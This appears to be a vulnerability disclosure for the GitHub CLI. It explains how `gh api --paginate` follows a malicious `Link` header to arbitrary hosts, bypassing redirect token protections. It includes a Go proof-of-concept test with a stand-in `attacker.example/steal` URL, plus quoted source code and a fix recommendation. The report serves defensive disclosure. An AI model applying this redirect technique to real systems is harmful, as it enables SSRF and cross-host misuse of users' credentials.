### Title
`gh api --paginate` follows attacker-controlled absolute URLs from the `Link` response header to arbitrary hosts, enabling authenticated SSRF/token leakage on other configured hosts - (File: `pkg/cmd/api/pagination.go`, `pkg/cmd/api/http.go`)

### Summary
`findNextPage` extracts the target of the next page directly from the `Link` response header without any host restriction, and `httpRequest` uses that value verbatim as the request URL whenever it contains `"://"`, bypassing the normal `ghinstance.RESTPrefix(hostname)` construction. A host that the victim points `gh api --paginate` at (a GHES instance, mirror, or proxy the attacker controls or has compromised) can therefore redirect subsequent pagination requests to an arbitrary URL of its choosing.

### Finding Description
The pagination loop in `apiRun` (`pkg/cmd/api/api.go:429-438`) is:
```go
resp, err := httpRequest(httpClient, host, method, requestPath, requestBody, requestHeaders)
...
requestPath, hasNextPage = findNextPage(resp)
``` [1](#0-0) 

`findNextPage` blindly parses the attacker-controlled `Link` header and returns whatever URL is embedded in the `rel="next"` entry, with no validation that it belongs to the same host/scheme as the original request: [2](#0-1) 

That value is fed back into `httpRequest` as `requestPath`. Because it contains `"://"`, `httpRequest` takes the `strings.Contains(p, "://")` branch and uses it as the literal request URL, completely skipping the `ghinstance.RESTPrefix(hostname)` construction that would otherwise pin the request to the configured host: [3](#0-2) 

The custom `requestHeaders` supplied via `-H` are re-applied unchanged to this new, attacker-chosen destination on every subsequent page (only `requestBody` is nulled out for GET pagination): [4](#0-3) 

Because this is a brand-new top-level `http.Request` (not a Go-native 3xx redirect), `AddAuthTokenHeader`'s cross-host redirect protection does not see it as a redirect (`req.Response` is nil), so `redirectHostnameChange` is `false`, and the transport proceeds to look up and attach a token for whatever host is now in the URL: [5](#0-4) 

Existing protection only covers genuine HTTP 3xx redirects handled internally by Go's `http.Client` (confirmed by `TestHTTPClientRedirectAuthenticationHeaderHandling`), not this application-level "follow the Link header to a new URL and issue a fresh request" pattern: [6](#0-5) 

So the safeguard that exists for standard redirects is bypassed by pagination.

### Impact Explanation
This is a **wrong-host request routing / authenticated SSRF** issue matching the specified impact class. A malicious/compromised host that the victim explicitly ran `gh api --paginate` against (e.g., a GHES instance or a proxy/mirror URL a repo's docs told the victim to use) can:
- Force the victim's `gh` process to make additional authenticated outbound HTTP requests to attacker-chosen URLs (SSRF pivot into internal network endpoints reachable from the victim's machine, e.g. cloud metadata services or internal admin endpoints), using the victim's local network position.
- Any custom sensitive header the victim passed via `-H` for the original request (e.g., a bearer token for the intended endpoint) is silently replayed to the attacker's chosen next-page URL.
- If the attacker steers the `Link` header to a URL whose host happens to match another host the victim already has stored credentials for (e.g. `github.com`), that host's stored token is attached to a request whose path/query the attacker fully controls, resulting in an authenticated request issued to a host/path the user never intended to hit with that identity.

This does not directly exfiltrate the token to `attacker.example` (token attachment is still gated by exact hostname match in `AddAuthTokenHeader`), but it does allow forced SSRF and cross-host, attacker-directed authenticated requests — a real violation of intended request routing/trust boundaries.

### Likelihood Explanation
- Requires the victim to run `gh api --paginate` (or `--paginate --slurp`) against a host controlled by, or whose responses are controlled by, the attacker (e.g., a documented mirror/proxy URL, or a compromised/malicious GHES instance) — consistent with the stated attacker model.
- No further victim interaction is needed beyond running the ordinary command; the attacker only needs to include a crafted `Link: <...>; rel="next"` header in any response.
- Fully repeatable/deterministic given a controlled HTTP server.

### Recommendation
In `findNextPage`/`httpRequest`, restrict pagination continuation to the same scheme+host as the original request (or resolve it relative to the current request's host only), and reject or ignore `Link` headers pointing to a different origin unless the API being queried is a recognized `ghinstance` host. Alternatively, apply the same `redirectHostnameChange`-style guard used for redirects to pagination-driven requests, ensuring the Authorization/custom headers are only forwarded when the next-page host matches the originally requested host.

### Proof of Concept
```go
func TestApiRun_PaginationFollowsForeignHostLinkHeader(t *testing.T) {
    var secondReqHost string
    var secondReqHasAuth bool

    reg := &httpmock.Registry{}
    defer reg.Verify(t)

    // First page: legitimate configured host, returns a Link header pointing
    // to a completely different, attacker-controlled origin.
    reg.Register(
        httpmock.REST("GET", "repos/o/r/issues"),
        func(req *http.Request) (*http.Response, error) {
            return &http.Response{
                StatusCode: 200,
                Header: http.Header{
                    "Content-Type": {"application/json"},
                    "Link":         {`<https://attacker.example/steal?path=%2Fadmin>; rel="next"`},
                },
                Body: io.NopCloser(strings.NewReader(`[]`)),
            }, nil
        },
    )
    // Second "page": request actually goes to attacker.example, not the
    // originally-configured host.
    reg.Register(
        httpmock.MatcherFunc(func(req *http.Request) bool { return true }),
        func(req *http.Request) (*http.Response, error) {
            secondReqHost = req.URL.Host
            secondReqHasAuth = req.Header.Get("Authorization") != ""
            return &http.Response{StatusCode: 200, Body: io.NopCloser(strings.NewReader(`[]`))}, nil
        },
    )

    // ... wire opts.HttpClient to &http.Client{Transport: reg}, opts.Paginate = true,
    // opts.RequestPath = "repos/o/r/issues", run apiRun(opts) ...

    assert.Equal(t, "attacker.example", secondReqHost) // request left the configured host
    // If the victim also has a stored token whose hostname matches "attacker.example"
    // (or the attacker guesses/targets a host the victim already trusts), secondReqHasAuth
    // would be true, demonstrating credential attachment to an attacker-directed request.
}
```
Expected assertion: the second HTTP request's destination host differs from the originally configured `--hostname`/`host`, proving that `gh api --paginate` blindly follows an attacker-supplied `Link` header to an arbitrary origin.

func findNextPage(resp *http.Response) (string, bool) {
	for _, m := range linkRE.FindAllStringSubmatch(resp.Header.Get("Link"), -1) {
		if len(m) > 2 && m[2] == "next" {
			return m[1], true
		}
	}
	return "", false
}

func httpRequest(client *http.Client, hostname string, method string, p string, params interface{}, headers []string) (*http.Response, error) {
	isGraphQL := p == "graphql"
	var requestURL string
	if strings.Contains(p, "://") {
		requestURL = p
	} else if isGraphQL {
		requestURL = ghinstance.GraphQLEndpoint(hostname)
	} else {
		// Note that the gh api command takes the path verbatim from the user, so we
		// intentionally do not route it through safeurl and do not escape it here.
		requestURL = ghinstance.RESTPrefix(hostname) + strings.TrimPrefix(p, "/")
	}

func AddAuthTokenHeader(rt http.RoundTripper, cfg tokenGetter) http.RoundTripper {
	return &funcTripper{roundTrip: func(req *http.Request) (*http.Response, error) {
		// If the header is already set in the request, don't overwrite it.
		if req.Header.Get(authorization) == "" {
			var redirectHostnameChange bool
			if req.Response != nil && req.Response.Request != nil {
				redirectHostnameChange = getHost(req) != getHost(req.Response.Request)
			}
			// Only set header if an initial request or redirect request to the same host as the initial request.
			// If the host has changed during a redirect do not add the authentication token header.
			if !redirectHostnameChange {
				hostname := ghauth.NormalizeHostname(getHost(req))
				if token, _ := cfg.ActiveToken(hostname); token != "" {
					req.Header.Set(authorization, fmt.Sprintf("token %s", token))
				}
			}
		}
		return rt.RoundTrip(req)
	}}
}

```go
func TestHTTPClientRedirectAuthenticationHeaderHandling(t *testing.T) {
	var request *http.Request
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		request = r
		w.WriteHeader(http.StatusNoContent)
	}))
	defer server.Close()

	var redirectRequest *http.Request
	redirectServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		redirectRequest = r
		http.Redirect(w, r, server.URL, http.StatusFound)
	}))
	defer redirectServer.Close()

	client, err := NewHTTPClient(HTTPClientOptions{
		Config: tinyConfig{
			fmt.Sprintf("%s:oauth_token", strings.TrimPrefix(redirectServer.URL, "http://")): "REDIRECT-TOKEN",
			fmt.Sprintf("%s:oauth_token", strings.TrimPrefix(server.URL, "http://")):         "TOKEN",
		},
	})
	require.NoError(t, err)

	req, err := http.NewRequest("GET", redirectServer.URL, nil)
	require.NoError(t, err)

	res, err := client.Do(req)
	require.NoError(t, err)

	assert.Equal(t, "token REDIRECT-TOKEN", redirectRequest.Header.Get(authorization))
	assert.Equal(t, "", request.Header.Get(authorization))
	assert.Equal(t, 204, res.StatusCode)
}
